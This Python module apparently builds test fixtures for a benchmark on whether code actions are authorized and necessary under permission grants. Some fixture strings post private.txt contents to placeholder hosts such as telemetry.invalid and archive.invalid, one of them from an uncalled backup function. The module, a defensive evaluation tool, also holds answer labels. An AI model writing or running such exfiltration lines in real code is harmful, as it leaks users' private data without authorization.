"""Independent finite reasoning fixtures, authored without extractor/model feedback.

These are source-capability specifications, not results of running the sources.
Task and implementation plans are explicitly closed finite alternatives unless
marked open. Source strings are data and must never be executed by this module.
The checked-in JSONL is the frozen observation input; regeneration is explicit.
"""
from __future__ import annotations

import json
from pathlib import Path


CASES_PATH = Path(__file__).resolve().parents[2] / "data/phase4/reasoning_cases.jsonl"
LABELS = ("action_valid", "authorized", "implementation_necessary", "task_necessary")
FAMILY_SPLITS = {
    "optional_allowed": "dev", "artificial_gate": "dev", "payload_ceiling": "dev",
    "missing_scope": "validation", "structural_decoys": "validation",
    "dependency_chain": "heldout", "uninvoked_capability": "heldout",
    "dynamic_target": "heldout",
}


def _candidate(cid, line, text, operation, resource, *, file="workflow.py", **extra):
    extra.setdefault("resource_status", "resolved" if resource is not None else "dynamic")
    return {"id": cid, "provenance": {"file": file, "line_start": line,
            "line_end": line}, "source_excerpt": text,
            "claim": {"operation": operation, "resource": resource, **extra}}


def _rule(operation, resource, **constraints):
    return {"operation": operation, "resource": resource, **constraints}


def _plan(pid, effects, **extra):
    return {"id": pid, "effects": effects, "satisfies_goal": True, **extra}


def _context(goal, rules, plans, implementation_plans, *, mode="closed_deny", **extra):
    return {"goal": goal, "grant": {"mode": mode, "rules": rules},
            "finite_model": {"task_plans_closed": plans is not None,
                "implementation_plans_closed": implementation_plans is not None,
                "plans": plans, "implementation_plans": implementation_plans,
                "basis": "Independently authored finite alternatives; source was not executed."},
            **extra}


def _truth(valid, authorized, implementation, task):
    return dict(zip(LABELS, (valid, authorized, implementation, task)))


def _case(family, index, lines, candidates, context, truth, *, file="workflow.py", notes=""):
    return {"case_id": f"{family}-{index}", "construction_family": family,
            "split": FAMILY_SPLITS[family], "files": {file: "\n".join(lines) + "\n"},
            "candidates": candidates, "task_context": context, "truth": truth,
            "assumptions": notes,
            "source_execution": "not_performed", "truth_origin": "independent_author"}


def _optional_cases():
    out = []
    for i, allowed in enumerate((True, False, True), 1):
        payload = "ready" if i != 3 else "archived"
        url = "https://status.invalid/event"
        lines = ["from pathlib import Path", "import requests",
                 'text = Path("input.txt").read_text()',
                 'Path("report.txt").write_text(text.upper())',
                 f'if notify: requests.post("{url}", data="{payload}")']
        c = [_candidate("read", 3, lines[2], "file.read", "input.txt"),
             _candidate("write", 4, lines[3], "file.write", "report.txt"),
             _candidate("notify", 5, lines[4], "network.post", url,
                        payload={"kind": "constant", "value": payload})]
        rules = [_rule("file.read", "input.txt"), _rule("file.write", "report.txt")]
        if allowed:
            rules.append(_rule("network.post", url, payload={"kind": "constant", "value": payload}))
        plans = [_plan("quiet", ["read", "write"])]
        if allowed:
            plans.append(_plan("with_notice", ["read", "write", "notify"]))
        ctx = _context("Uppercase input.txt into report.txt; notification is optional.", rules,
                       plans, [_plan("quiet", ["read", "write"]),
                               _plan("notify_branch", ["read", "write", "notify"])],
                       inputs={"notify": "user-selectable Boolean", "input.txt": "public text"})
        out.append(_case("optional_allowed", i, lines, c, ctx,
                         {"read": _truth("yes", "yes", "yes", "yes"),
                          "write": _truth("yes", "yes", "yes", "yes"),
                          "notify": _truth("yes", "yes" if allowed else "no", "no", "no")},
                         notes="Both Boolean branches are finite implementation alternatives."))
    return out


def _gate_cases():
    out = []
    for i in range(1, 4):
        url = f"https://gate.invalid/check{i}"
        lines = ["from pathlib import Path", "import requests",
                 'data = Path("input.txt").read_text()',
                 f'gate = requests.get("{url}")',
                 'if gate.status_code == 200: Path("report.txt").write_text(data)']
        c = [_candidate("read", 3, lines[2], "file.read", "input.txt"),
             _candidate("gate", 4, lines[3], "network.get", url),
             _candidate("write", 5, lines[4], "file.write", "report.txt")]
        rules = [_rule("file.read", "input.txt"), _rule("file.write", "report.txt")]
        gate_allowed = i != 2
        if gate_allowed:
            rules.append(_rule("network.get", url))
        task_plans = [_plan("local_reference", ["read", "write"],
                            definition="Copy input bytes directly to report, with no gate call.")]
        if gate_allowed:
            task_plans.append(_plan("gated", ["read", "gate", "write"]))
        ctx = _context("Copy input.txt byte-for-byte into report.txt.", rules, task_plans,
                       [_plan("gate_success", ["read", "gate", "write"])],
                       inputs={"gate_response_domain": [200, 403]},
                       initial_contract={"network": "all" if i == 3 else "exact grant"})
        out.append(_case("artificial_gate", i, lines, c, ctx,
                         {"read": _truth("yes", "yes", "yes", "yes"),
                          "gate": _truth("yes", "yes" if gate_allowed else "no", "yes", "no"),
                          "write": _truth("yes", "yes", "yes", "yes")},
                         notes="Implementation plans contain goal-satisfying paths only. The local reference is a defined alternative, not a runtime result."))
    return out


def _payload_cases():
    out = []
    for i, private in enumerate((False, True, True), 1):
        url = "https://telemetry.invalid/ingest"
        payload = {"kind": "file", "source": "private.txt"} if private else {"kind": "constant", "value": "health=ok"}
        lines = ["from pathlib import Path", "import requests",
                 'secret = Path("private.txt").read_text()',
                 'Path("report.txt").write_text("complete")',
                 f'requests.post("{url}", data={"secret" if private else chr(34) + "health=ok" + chr(34)})']
        c = [_candidate("read_private", 3, lines[2], "file.read", "private.txt"),
             _candidate("report", 4, lines[3], "file.write", "report.txt"),
             _candidate("send", 5, lines[4], "network.post", url, payload=payload)]
        exact_payload = {"kind": "constant", "value": "health=ok"}
        rules = [_rule("file.read", "private.txt"), _rule("file.write", "report.txt"),
                 _rule("network.post", url, payload=exact_payload)]
        initial_rules = ([_rule("network.post", url)] if i != 3 else [])
        ctx = _context("Write the literal complete into report.txt; telemetry is optional and may contain only health=ok.",
                       rules, [_plan("local_reference", ["report"], definition="Write the specified constant locally.")],
                       [_plan("source_path", ["read_private", "report", "send"])],
                       initial_contract={"mode": "closed_deny", "rules": initial_rules},
                       data_classification={"private.txt": "private"})
        out.append(_case("payload_ceiling", i, lines, c, ctx,
                         {"read_private": _truth("yes", "yes", "yes", "no"),
                          "report": _truth("yes", "yes", "yes", "yes"),
                          "send": _truth("yes", "no" if private else "yes", "yes", "no")},
                         notes="The grant is the trusted authorization ceiling. Initial contract omits payload restrictions or is underbroad; it cannot enlarge that ceiling."))
    return out


def _missing_cases():
    out = []
    for i in range(1, 4):
        url = f"https://service.invalid/result{i}"
        lines = ["from pathlib import Path", "import requests",
                 'value = Path("input.txt").read_text()',
                 'Path("result.txt").write_text(value)',
                 f'requests.post("{url}", data=value)']
        c = [_candidate("read", 3, lines[2], "file.read", "input.txt"),
             _candidate("write", 4, lines[3], "file.write", "result.txt"),
             _candidate("send", 5, lines[4], "network.post", url,
                        payload={"kind": "file", "source": "input.txt"})]
        rules = [] if i == 1 else [_rule("file.read", "input.txt")]
        if i == 3:
            rules.append(_rule("file.write", "result.txt"))
        goal = ("Copy input.txt into result.txt; permission for network actions was not supplied."
                if i == 3 else "Process the input; required output was not supplied.")
        ctx = _context(goal, rules,
                       [_plan("local_copy", ["read", "write"])] if i == 3 else None,
                       [_plan("source", ["read", "write", "send"])] if i == 3 else None,
                       mode="underspecified",
                       missing_scope=["permitted network"] if i == 3 else ["required output", "permissions outside explicit rules"],
                       request_fragment=("Process it", "You may read input.txt; process it", "Copy the local input")[i - 1])
        truth = {cid: _truth("yes", "unknown", "unknown", "unknown")
                 for cid in ("read", "write", "send")}
        if i >= 2:
            truth["read"]["authorized"] = "yes"
        if i == 3:
            truth = {"read": _truth("yes", "yes", "yes", "yes"),
                     "write": _truth("yes", "yes", "yes", "yes"),
                     "send": _truth("yes", "unknown", "yes", "no")}
        out.append(_case("missing_scope", i, lines, c, ctx,
                         truth,
                         notes="Missing permissions remain open; explicit grants still bind. Unknown goal scope prevents necessity judgments in variants 1 and 2."))
    return out


def _decoy_cases():
    out = []
    for i in range(1, 4):
        url = f"https://blocked.invalid/upload{i}"
        metadata = (f'example_upload: "{url}"',
                    'oauth_scope: "https://identity.invalid/auth/files.read"',
                    f'forbidden_destination: "{url}"')[i - 1]
        prohibition = (f"Do not POST private.txt to {url}.",
                       f"Never read private.txt or POST it to {url}.",
                       "# Prohibition: do not read private.txt")[i - 1]
        lines = ["---", metadata, "---", prohibition,
                 "```python", "from pathlib import Path",
                 'Path("report.txt").write_text("ready")', "```"]
        metadata_resource = "https://identity.invalid/auth/files.read" if i == 2 else url
        c = [_candidate("metadata", 2, lines[1], "network.get" if i == 2 else "network.post", metadata_resource, file="SKILL.md"),
             _candidate("negation", 4, lines[3], "file.read", "private.txt", file="SKILL.md"),
             _candidate("write", 7, lines[6], "file.write", "report.txt", file="SKILL.md")]
        ctx = _context("Create report.txt containing ready using the shown Python snippet.",
                       [_rule("file.write", "report.txt")], [_plan("write", ["write"])],
                       [_plan("snippet", ["write"])],
                       workflow_selection="The user explicitly selects the fenced snippet as the implementation.")
        out.append(_case("structural_decoys", i, lines, c, ctx,
                         {"metadata": _truth("no", "no", "no", "no"),
                          "negation": _truth("no", "no", "no", "no"),
                          "write": _truth("yes", "yes", "yes", "yes")}, file="SKILL.md",
                         notes="Metadata and prohibition contain no action capability matching their candidate claims. The finite task excludes both nonexistent effects."))
    return out


def _dependency_cases():
    out = []
    for i in range(1, 4):
        url = "https://delivery.invalid/final"
        target = url if i != 3 else "https://delivery.invalid/other"
        lines = ["from pathlib import Path", "import requests",
                 f'base = "{target.rsplit("/", 1)[0]}"',
                 f'leaf = "{target.rsplit("/", 1)[1]}"', "destination = base + '/' + leaf",
                 'source = "public.txt"', 'text = Path(source).read_text()',
                 'Path("report.txt").write_text(text)',
                 'requests.post(destination, data=Path("report.txt").read_text())']
        c = [_candidate("read", 7, lines[6], "file.read", "public.txt"),
             _candidate("write", 8, lines[7], "file.write", "report.txt"),
             _candidate("reread", 9, lines[8], "file.read", "report.txt"),
             _candidate("deliver", 9, lines[8], "network.post", target,
                        payload={"kind": "file", "source": "report.txt"})]
        rules = [_rule("file.read", "public.txt"), _rule("file.write", "report.txt"),
                 _rule("file.read", "report.txt"),
                 _rule("network.post", url, payload={"kind": "file", "source": "report.txt"})]
        # The independent reference carries bytes directly; it does not reread the artifact.
        plans = [_plan("direct_delivery", ["read", "write", "deliver"],
                       definition="Read public input once, write its copy, deliver the same held bytes.")]
        if i == 2:
            plans.append(_plan("reread_delivery", ["read", "write", "reread", "deliver"]))
        if i == 3:
            # This source cannot satisfy the exact destination goal. The reference
            # has a distinct effect, represented by a non-candidate model effect.
            plans = [_plan("correct_reference", ["read", "write", "reference_deliver"],
                           definition="Deliver public bytes to the exact final URL directly.")]
        ctx = _context("Copy public.txt to report.txt and deliver those public bytes to https://delivery.invalid/final.",
                       rules, plans, [] if i == 3 else [_plan("source", ["read", "write", "reread", "deliver"])],
                       finite_reference_effects={"reference_deliver": {"operation": "network.post", "resource": url,
                           "payload": {"kind": "file", "source": "report.txt"}}} if i == 3 else {})
        out.append(_case("dependency_chain", i, lines, c, ctx,
                         {"read": _truth("yes", "yes", "unknown" if i == 3 else "yes", "yes"),
                          "write": _truth("yes", "yes", "unknown" if i == 3 else "yes", "yes"),
                          "reread": _truth("yes", "yes", "unknown" if i == 3 else "yes", "no"),
                          "deliver": _truth("yes", "no" if i == 3 else "yes", "unknown" if i == 3 else "yes", "no" if i == 3 else "yes")},
                         notes="Literal concatenation determines the exact target. An empty successful implementation set makes implementation necessity unknown, never vacuously yes."))
    return out


def _uninvoked_cases():
    out = []
    for i in range(1, 4):
        url = f"https://archive.invalid/private{i}"
        lines = ["from pathlib import Path", "import requests", "def unused_backup():",
                 '    secret = Path("private.txt").read_text()',
                 f'    requests.post("{url}", data=secret)',
                 'Path("report.txt").write_text("ready")']
        filename = "workflow.py"
        read_line, send_line, write_line = 4, 5, 6
        if i == 2:
            lines = ["Illustrative backup function, not part of the selected workflow:", "```python", *lines, "```"]
            filename = "SKILL.md"
            read_line, send_line, write_line = 6, 7, 8
        if i == 3:
            lines.insert(5, 'if False: unused_backup()')
            write_line = 7
        c = [_candidate("private_read", read_line, lines[read_line - 1], "file.read", "private.txt", file=filename),
             _candidate("backup", send_line, lines[send_line - 1], "network.post", url, file=filename,
                        payload={"kind": "file", "source": "private.txt"}),
             _candidate("report", write_line, lines[write_line - 1], "file.write", "report.txt", file=filename)]
        ctx = _context("Run only the top-level report write; create report.txt containing ready.",
                       [_rule("file.write", "report.txt")], [_plan("report", ["report"])],
                       [_plan("top_level", ["report"])],
                       workflow_selection="Only top-level report statement; no function invocation is requested.")
        out.append(_case("uninvoked_capability", i, lines, c, ctx,
                         {"private_read": _truth("yes", "no", "no", "no"),
                          "backup": _truth("yes", "no", "no", "no"),
                          "report": _truth("yes", "yes", "yes", "yes")}, file=filename,
                         notes="A capability inside an uncalled function remains action_valid=yes. Reachability and authorization are distinct labels."))
    return out


def _dynamic_cases():
    out = []
    for i in range(1, 4):
        env_name = ("DESTINATION", "MIRROR", "CALLBACK")[i - 1]
        lines = ["from pathlib import Path", "import os", "import requests",
                 f'target = os.environ["{env_name}"]',
                 'Path("report.txt").write_text("ready")',
                 'requests.post(target, data="ready")']
        target_domain = (["https://allowed.invalid/result"] if i == 2 else
                         ["https://denied.invalid/one", "https://denied.invalid/two"] if i == 3 else None)
        dynamic_extra = {"resource_domain": target_domain} if target_domain else {}
        c = [_candidate("env", 4, lines[3], "environment.read", env_name),
             _candidate("report", 5, lines[4], "file.write", "report.txt"),
             _candidate("send", 6, lines[5], "network.post", None,
                        resource_status="dynamic", resource_expression=f'os.environ["{env_name}"]',
                        payload={"kind": "constant", "value": "ready"}, **dynamic_extra)]
        rules = [_rule("environment.read", env_name), _rule("file.write", "report.txt"),
                 _rule("network.post", "https://allowed.invalid/result",
                       payload={"kind": "constant", "value": "ready"})]
        ctx = _context("Create report.txt containing ready. Sending a ready notice is optional only to the exact permitted URL.",
                       rules, [_plan("local_reference", ["report"], definition="Write the constant locally.")],
                       [_plan("source", ["env", "report", "send"])],
                       unresolved_inputs={env_name: "Runtime URL is not supplied."},
                       runtime_constraints={env_name: target_domain or "unbounded URL"})
        out.append(_case("dynamic_target", i, lines, c, ctx,
                         {"env": _truth("yes", "yes", "yes", "no"),
                          "report": _truth("yes", "yes", "yes", "yes"),
                          "send": _truth("yes", ("unknown", "yes", "no")[i - 1], "yes", "no")},
                         notes="Source target remains dynamic. Trusted runtime domains can nevertheless establish universal allow or deny; an unbounded domain requires unknown."))
    return out


def build_reasoning_cases():
    """Return independently specified fixtures, without interpreting their sources."""
    return [*_optional_cases(), *_gate_cases(), *_payload_cases(), *_missing_cases(),
            *_decoy_cases(), *_dependency_cases(), *_uninvoked_cases(), *_dynamic_cases()]


def load_reasoning_cases(path=CASES_PATH):
    return [json.loads(line) for line in Path(path).read_text(encoding="utf-8").splitlines() if line]


def freeze_reasoning_cases(path=CASES_PATH):
    """Write once; frozen inputs are never overwritten, even with identical data."""
    destination = Path(path)
    destination.parent.mkdir(parents=True, exist_ok=True)
    with destination.open("x", encoding="utf-8", newline="\n") as handle:
        for case in build_reasoning_cases():
            handle.write(json.dumps(case, ensure_ascii=False, sort_keys=True) + "\n")
    return destination


if __name__ == "__main__":
    print(freeze_reasoning_cases())
